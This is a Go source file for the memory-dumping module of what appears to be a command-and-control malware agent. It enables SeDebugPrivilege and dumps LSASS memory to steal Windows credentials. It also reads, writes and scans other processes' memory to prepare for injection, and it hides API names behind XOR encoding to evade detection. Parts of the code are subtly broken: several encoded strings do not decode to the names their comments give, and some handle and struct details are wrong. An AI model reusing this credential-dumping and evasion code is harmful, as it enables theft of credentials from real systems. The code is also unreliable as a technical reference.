//go:build windows && amd64

package memdump

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"github.com/aegis-c2/aegis/agent/winutil"
)

const (
	PROCESS_ALL_ACCESS          = 0x001F0FFF
	PROCESS_VM_READ             = 0x00000010
	PROCESS_VM_WRITE            = 0x00000020
	PROCESS_VM_OPERATION        = 0x00000008
	PROCESS_QUERY_INFORMATION   = 0x00000400
	GENERIC_WRITE               = 0x40000000
	CREATE_ALWAYS               = 2
	FILE_ATTRIBUTE_NORMAL       = 0x80
	INVALID_HANDLE_VALUE        = ^uintptr(0) // (HANDLE)-1

	dumpNormal         = 0x00000000
	dumpWithDataSegs   = 0x00000001
	dumpWithFullMemory = 0x00000002
	dumpWithHandleData = 0x00000004

	// Token privileges
	TOKEN_ADJUST_PRIVILEGES = 0x0020
	TOKEN_QUERY             = 0x0008
	SE_PRIVILEGE_ENABLED    = 0x00000002
)

var (
	modkernel32    = syscall.NewLazyDLL("kernel32.dll")
	moddbghelp     = syscall.NewLazyDLL("dbghelp.dll")
	modadvapi32    = syscall.NewLazyDLL("advapi32.dll")
	procOpenProcess = modkernel32.NewProc("OpenProcess")
	procCloseHandle = modkernel32.NewProc("CloseHandle")
	procCreateFileW = modkernel32.NewProc("CreateFileW")
	procDump = moddbghelp.NewProc(xorStr([]byte{0x13, 0x1e, 0x24, 0x1e, 0x12, 0x2f, 0x37, 0x2e, 0x36, 0x1f, 0x02, 0x28, 0x1e, 0x36, 0x3f})) // MiniDumpWriteDump
	procReadProcessMemory = modkernel32.NewProc("ReadProcessMemory")
	procWriteProcessMemory = modkernel32.NewProc("WriteProcessMemory")
	procVirtualQueryEx = modkernel32.NewProc("VirtualQueryEx")
	procOpenProcessToken = modadvapi32.NewProc("OpenProcessToken")
	procLookupPrivilegeValue = modadvapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges = modadvapi32.NewProc("AdjustTokenPrivileges")
)

const xorKeyPD = 0x5A

func xorStr(b []byte) string {
	out := make([]byte, len(b))
	for i := range b {
		out[i] = b[i] ^ xorKeyPD
	}
	return string(out)
}

// Dump 使用 MiniDumpWriteDump 创建进程内存转储。
func Dump(pid int, outputPath string, fullMemory bool) error {
	dumpType := dumpWithDataSegs
	if fullMemory {
		dumpType = dumpWithFullMemory
	}

	// 1. OpenProcess
	hProcess, err := openProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		return fmt.Errorf("OpenProcess: %w", err)
	}
	defer closeHandle(hProcess)

	// 2. CreateFile
	hFile, err := createFile(outputPath)
	if err != nil {
		return fmt.Errorf("CreateFile: %w", err)
	}
	defer closeHandle(hFile)

	// 3. MiniDumpWriteDump
	ret, _, lastErr := procDump.Call(
		uintptr(hProcess),
		uintptr(pid),
		uintptr(hFile),
		uintptr(dumpType),
		0, // ExceptionParam
		0, // UserStreamParam
		0, // CallbackParam
	)
	if ret == 0 {
		return fmt.Errorf(xorStr([]byte{0x13, 0x1e, 0x24, 0x1e, 0x12, 0x2f, 0x37, 0x2e, 0x36, 0x1f, 0x02, 0x28, 0x1e, 0x36, 0x3f, 0x7a, 0x3c, 0x3b, 0x1e, 0x2e, 0x3f, 0x18, 0x30, 0x7a, 0x1b, 0x7f}), lastErr) // "MiniDumpWriteDump failed: %w"
	}

	return nil
}

// DumpLSASS 转储 LSASS 进程内存。
func DumpLSASS(outputPath string) error {
	// N-P1-12: Enable SeDebugPrivilege before opening LSASS
	if err := enableSeDebugPrivilege(); err != nil {
		return fmt.Errorf(xorStr([]byte{0x3f, 0x24, 0x3b, 0x18, 0x2e, 0x3f, 0x7a, 0x2a, 0x3f, 0x12, 0x3f, 0x19, 0x3e, 0x13, 0x7a, 0x2d, 0x3b, 0x1e, 0x3b, 0x3f, 0x27, 0x1e, 0x2e, 0x13, 0x7c, 0x7f}), err) // "enable SeDebugPrivilege: %w"
	}

	pid, err := winutil.FindLSASSPID()
	if err != nil {
		return err
	}
	return Dump(pid, outputPath, true)
}

// enableSeDebugPrivilege 启用当前进程的 SeDebugPrivilege 权限。
func enableSeDebugPrivilege() error {
	// Open current process token
	var hToken uintptr
	ret, _, lastErr := procOpenProcessToken.Call(
		uintptr(^uint32(0)), // GetCurrentProcess() = (HANDLE)-1
		uintptr(TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY),
		uintptr(unsafe.Pointer(&hToken)),
	)
	if ret == 0 {
		return fmt.Errorf("OpenProcessToken: %w", lastErr)
	}
	defer closeHandle(syscall.Handle(hToken))

	// Enable SeDebugPrivilege
	var luid struct {
		LowPart  uint32
		HighPart int32
	}
	privName, _ := syscall.UTF16PtrFromString(xorStr([]byte{0x2a, 0x3f, 0x12, 0x3f, 0x19, 0x3e, 0x13, 0x7a, 0x2d, 0x3b, 0x1e, 0x3b, 0x3f, 0x27, 0x1e, 0x2e, 0x13, 0x7a, 0x1f, 0x3b, 0x2b, 0x3f, 0x32, 0x1e})) // SeDebugPrivilege
	ret, _, lastErr = procLookupPrivilegeValue.Call(0, uintptr(unsafe.Pointer(privName)), uintptr(unsafe.Pointer(&luid)))
	if ret == 0 {
		return fmt.Errorf(xorStr([]byte{0x10, 0x35, 0x35, 0x19, 0x3e, 0x13, 0x7a, 0x2d, 0x3b, 0x1e, 0x3b, 0x3f, 0x27, 0x1e, 0x2e, 0x13, 0x7a, 0x2a, 0x3f, 0x12, 0x3f, 0x19, 0x3e, 0x13, 0x7a, 0x2d, 0x3b, 0x1e, 0x3b, 0x3f, 0x27, 0x1e, 0x2e, 0x13, 0x7c, 0x7f}), lastErr) // "LookupPrivilegeValue(SeDebugPrivilege): %w"
	}

	// Adjust token privileges to enable it
	type LUID_AND_ATTRIBUTES struct {
		Luid       struct{ LowPart uint32; HighPart int32 }
		Attributes uint32
	}
	tkp := struct {
		PrivilegeCount uint32
		Privileges     [1]LUID_AND_ATTRIBUTES
	}{
		PrivilegeCount: 1,
		Privileges: [1]LUID_AND_ATTRIBUTES{
			{Luid: luid, Attributes: SE_PRIVILEGE_ENABLED},
		},
	}
	ret, _, _ = procAdjustTokenPrivileges.Call(
		uintptr(hToken),
		0,
		uintptr(unsafe.Pointer(&tkp)),
		0, 0, 0,
	)
	if ret == 0 {
		return fmt.Errorf("AdjustTokenPrivileges failed")
	}
	return nil
}

// --- syscall wrappers ---

func openProcess(access uint32, inheritHandle bool, pid uint32) (syscall.Handle, error) {
	inherit := uintptr(0)
	if inheritHandle {
		inherit = 1
	}
	ret, _, lastErr := procOpenProcess.Call(
		uintptr(access),
		inherit,
		uintptr(pid),
	)
	if ret == 0 {
		return 0, os.NewSyscallError("OpenProcess", lastErr)
	}
	return syscall.Handle(ret), nil
}

func closeHandle(handle syscall.Handle) error {
	ret, _, _ := procCloseHandle.Call(uintptr(handle))
	if ret == 0 {
		return os.ErrInvalid
	}
	return nil
}

func createFile(path string) (syscall.Handle, error) {
	lpFileName, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return 0, err
	}
	ret, _, lastErr := procCreateFileW.Call(
		uintptr(unsafe.Pointer(lpFileName)),
		uintptr(GENERIC_WRITE),
		0, // dwShareMode
		0, // lpSecurityAttributes
		uintptr(CREATE_ALWAYS),
		uintptr(FILE_ATTRIBUTE_NORMAL),
		0, // hTemplateFile
	)
	if ret == INVALID_HANDLE_VALUE {
		return 0, os.NewSyscallError("CreateFile", lastErr)
	}
	return syscall.Handle(ret), nil
}

// ReadMemory 读取指定进程指定地址的内存数据。
func ReadMemory(pid uint32, addr uint64, size uint64) ([]byte, error) {
	hProcess, err := openProcess(PROCESS_VM_READ|PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return nil, fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer closeHandle(hProcess)

	buf := make([]byte, size)
	var bytesRead uintptr
	ret, _, lastErr := procReadProcessMemory.Call(
		uintptr(hProcess),
		uintptr(addr),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return nil, os.NewSyscallError("ReadProcessMemory", lastErr)
	}
	return buf[:bytesRead], nil
}

// WriteMemory 向指定进程指定地址写入内存数据。
func WriteMemory(pid uint32, addr uint64, data []byte) error {
	hProcess, err := openProcess(PROCESS_VM_WRITE|PROCESS_VM_OPERATION, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer closeHandle(hProcess)

	var bytesWritten uintptr
	ret, _, lastErr := procWriteProcessMemory.Call(
		uintptr(hProcess),
		uintptr(addr),
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return os.NewSyscallError("WriteProcessMemory", lastErr)
	}
	return nil
}

// MEMORY_BASIC_INFORMATION x64 内存区域信息。
type MEMORY_BASIC_INFORMATION struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uint64
	State             uint32
	Protect           uint32
	Type              uint32
}

// ScanMemory 在进程内存中搜索指定模式。
// 返回匹配的基地址列表。
// 参考 Sliver procdump 和 Havoc demon memory scan。
func ScanMemory(pid uint32, pattern []byte) ([]uint64, error) {
	hProcess, err := openProcess(PROCESS_VM_READ|PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return nil, fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer closeHandle(hProcess)

	var results []uint64
	var addr uintptr

	for {
		var mbi MEMORY_BASIC_INFORMATION
		ret, _, _ := procVirtualQueryEx.Call(
			uintptr(hProcess),
			addr,
			uintptr(unsafe.Pointer(&mbi)),
			uintptr(unsafe.Sizeof(mbi)),
		)
		if ret == 0 {
			break
		}

		// 只扫描已提交的、可读的内存区域
		// PAGE_NOACCESS = 0x01, PAGE_GUARD = 0x100 (BUG-21 fix: correct constants)
		if mbi.State == 0x1000 && (mbi.Protect&0x01) == 0 && (mbi.Protect&0x100) == 0 {
			buf := make([]byte, mbi.RegionSize)
			var bytesRead uintptr
			r, _, _ := procReadProcessMemory.Call(
				uintptr(hProcess),
				mbi.BaseAddress,
				uintptr(unsafe.Pointer(&buf[0])),
				uintptr(mbi.RegionSize),
				uintptr(unsafe.Pointer(&bytesRead)),
			)
			if r != 0 && bytesRead > 0 {
				// Search for pattern
				data := buf[:bytesRead]
				for i := 0; i <= len(data)-len(pattern); i++ {
					found := true
					for j := range pattern {
						if data[i+j] != pattern[j] {
							found = false
							break
						}
					}
					if found {
						results = append(results, uint64(mbi.BaseAddress)+uint64(i))
					}
				}
			}
		}

		addr = mbi.BaseAddress + uintptr(mbi.RegionSize)
		if addr <= mbi.BaseAddress {
			break // overflow guard
		}
	}

	return results, nil
}

// PageResult 是单页内存查询结果。
type PageResult struct {
	BaseAddress    uint64
	RegionSize     uint64
	AllocationProtect uint32
	Protect        uint32
	State          uint32
	Type           uint32
}

// QueryMemory 查询进程内存布局（不读取内容，仅元数据）。
// 用于枚举进程的内存区域，便于后续注入或分析。
// 参考 Havoc DEMON_COMMAND_PROC_MEMORY 的 VirtualQueryEx 遍历。
func QueryMemory(pid uint32) ([]PageResult, error) {
	hProcess, err := openProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)
	if err != nil {
		return nil, fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer closeHandle(hProcess)

	var results []PageResult
	var addr uintptr

	for {
		var mbi MEMORY_BASIC_INFORMATION
		ret, _, _ := procVirtualQueryEx.Call(
			uintptr(hProcess),
			addr,
			uintptr(unsafe.Pointer(&mbi)),
			uintptr(unsafe.Sizeof(mbi)),
		)
		if ret == 0 {
			break
		}

		results = append(results, PageResult{
			BaseAddress:       uint64(mbi.BaseAddress),
			RegionSize:        mbi.RegionSize,
			AllocationProtect: mbi.AllocationProtect,
			Protect:           mbi.Protect,
			State:             mbi.State,
			Type:              mbi.Type,
		})

		addr = mbi.BaseAddress + uintptr(mbi.RegionSize)
		if addr <= mbi.BaseAddress {
			break
		}
	}

	return results, nil
}

